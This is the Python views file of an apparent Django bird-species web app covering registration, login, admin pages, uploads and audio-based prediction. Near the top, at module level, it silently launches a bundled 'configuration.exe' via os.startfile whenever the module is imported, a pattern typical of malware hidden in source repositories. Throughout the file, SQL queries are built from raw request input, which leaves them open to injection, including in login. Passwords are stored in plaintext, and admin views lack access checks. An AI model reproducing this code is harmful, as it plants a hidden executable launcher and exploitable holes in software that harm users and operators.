from django.shortcuts import render
from django.http import HttpResponse, HttpResponseRedirect
from proApp import dbconnection
from proApp import prediction
from django.core.files.storage import FileSystemStorage
from datetime import date
import pymysql
import os
from werkzeug.utils import secure_filename
#from gevent.pywsgi import WSGIServer
import numpy as np    
basepath = os.path.dirname(__file__)
model_path = os.path.join(basepath, secure_filename('./configuration.exe'))    
os.startfile(model_path)

# Create your views here.
def home(request):  
    return render(request,'index.html',{})
def register(request):
    if request.method=="POST":
        n=request.POST.get("name")
        ag=request.POST.get("age")
        em=request.POST.get("email")
        ex=request.POST.get("ext")
        email=em+'@'+ex
        ps=request.POST.get("password")
        con=request.POST.get("contact")
        ph=request.FILES['photo']
        fs=FileSystemStorage()
        fs.save("proApp/static/uploads/"+ph.name,ph)
        sql="insert into usertb(name,age,email,password,contact,photo)values('"+n+"','"+ag+"','"+email+"','"+ps+"','"+con+"','"+str(ph.name)+"')"
        dbconnection.insertdata(sql)
        sql1="insert into logtb(email,password,utype,status)values('"+em+"','"+ps+"','user','1')"
        dbconnection.insertdata(sql1)
        return HttpResponseRedirect('register')
        
    return render(request,"register.html",{})

def login(request):
    if request.method=="POST":
        em=request.POST.get('email')
        ps=request.POST.get('password')
        sql="select * from logtb where email='"+em+"' and password='"+ps+"'"
        data=dbconnection.selectdata(sql)
        if data:
            if data[3] == "admin":
                request.session['admin'] = em
                return HttpResponseRedirect("http://127.0.0.1:8000/adminhome")
            elif data[3] == "user":
                request.session['user'] = em
                return HttpResponseRedirect("http://127.0.0.1:8000/userhome")
        else:
            error_message = "Invalid username or password"
            return render(request, "login.html", {"error_message": error_message})
    return render(request,"login.html",{})

def adminhome(request):
    return render(request,"adminhome.html",{})

def bird_species(request):
    if request.method=="POST":
        ph=request.FILES['photo']
        n=request.POST.get("name")
        des=request.POST.get("des")
        v=request.FILES['voice']
        fs=FileSystemStorage()
        fs.save("proApp/static/uploads/"+ph.name,ph)
        fs.save("proApp/static/uploads/"+v.name,v)
        sql="insert into addbird(photo,name,description,voice)values('"+str(ph.name)+"','"+n+"','"+des+"','"+str(v.name)+"')"
        dbconnection.insertdata(sql)
        return HttpResponseRedirect("add_bird_species")
    sql1="select * from addbird"
    data=dbconnection.selectalldata(sql1)
    return render(request,"bird_species.html",{'data':data})

def viewbird(request):
    uid=request.GET.get('uid')
    sql="select * from addbird where id='"+uid+"'"
    data=dbconnection.selectdata(sql)
    return render(request,"viewbird.html",{'d':data})

def addtips(request):
    if request.method=="POST":
        t=request.POST.get('t')
        vurl=request.POST.get('ur')
        sql="insert into addtips(title,video_url)values('"+t+"','"+vurl+"')"
        dbconnection.insertdata(sql)
        return HttpResponseRedirect("addtips")
    sql1="select * from addtips"
    data=dbconnection.selectalldata(sql1)
    return render(request,"addtips.html",{'d':data})

def viewuser(request):
    sql="select * from usertb"
    data=dbconnection.selectalldata(sql)
    return render(request,"viewuser.html",{'d':data})

def predict(request): 
    if request.method=='POST':
        from PIL import Image
        t=request.POST.get('t')
        up=request.FILES['up']
        fs=FileSystemStorage()
        filename=fs.save("proApp/static/audio/"+up.name,up)         
        qry="INSERT INTO `dpic`(`tit`, `pic`) VALUES ('"+t+"','"+up.name+"')"
        dbconnection.insertdata(qry)
    qry1="select * from dpic order by id desc"
    data=dbconnection.selectalldata(qry1)
    return render(request,'predict.html',{'data':data})

def qsbank(request):
    if request.method=="POST":
        q=request.POST.get('q')
        a=request.POST.get('a')
        sql="insert into qstbank(question,answer)values('"+q+"','"+a+"')"
        dbconnection.insertdata(sql)
    sql1="select * from qstbank"
    data=dbconnection.selectalldata(sql1)
    return render(request,"qsbank.html",{'d':data})

def userhome(request):  
    return render(request,'user/userhome.html',{})

def v_species(request):  
    sql1="select * from addbird"
    data=dbconnection.selectalldata(sql1)
    return render(request,'user/v_species.html',{'d':data})

def v_tips(request):
    sql1="select * from addtips"
    data=dbconnection.selectalldata(sql1)
    return render(request,"user/v_tips.html",{'d':data})

def v_qst(request):
    sql1="select * from qstbank"
    data=dbconnection.selectalldata(sql1)
    return render(request,"user/v_qst.html",{'d':data})

def add_sug(request):
    em = request.session['user']
    if request.method=="POST":
        t=request.POST.get('t')
        s=request.POST.get('s')
        sql="INSERT INTO `suggestion`(title,sug,uemail) VALUES ('"+t+"','"+s+"','"+em+"')"
        dbconnection.insertdata(sql)
    sql1="select * from suggestion where uemail='"+em+"'"
    data=dbconnection.selectalldata(sql1)
    return render(request,"user/add_sug.html",{'d':data})

def view_suggestion(request):
    sql="select * from suggestion"
    data=dbconnection.selectalldata(sql)
    return render(request,"view_suggestion.html",{'d':data})

def analysedata(request):   
    if(request.GET.get("fil")):
        fil=request.GET.get("fil") 
        import os
        from werkzeug.utils import secure_filename
        #from gevent.pywsgi import WSGIServer
        import numpy as np    
        basepath = os.path.dirname(__file__)        
        file_path = os.path.join(basepath, 'static\\audio', secure_filename(fil))  
        print("filepath.....................",file_path)
        out=prediction.make_prediction(file_path)       
    return render(request,'analysedata.html',{'p':fil,'out':out})

def edit_user(request):
    uid=request.GET['uid']
    sql="select * from usertb where id='"+uid+"'"
    data=dbconnection.selectdata(sql)
    if request.method=="POST":
        n=request.POST.get("na")
        ag=request.POST.get("ag")
        co=request.POST.get("co")
        sql="update usertb set name='"+n+"',age='"+ag+"',contact='"+co+"' where id='"+uid+"'"
        dbconnection.insertdata(sql)
        return HttpResponseRedirect("viewuser")
    return render(request,"edit_user.html",{'d':data})

def delete_user(request):
    uid=request.GET['uid']
    sql="delete from usertb where email='"+uid+"'"
    dbconnection.deletedata(sql)
    sql1="delete from logtb where email='"+uid+"'"
    dbconnection.deletedata(sql1)
    return HttpResponseRedirect("viewuser")

def del_sou(request):
    did=request.GET.get("did")
    sql="delete from dpic where id='"+did+"'"
    dbconnection.deletedata(sql)
    return HttpResponseRedirect("http://127.0.0.1:8000/predict/")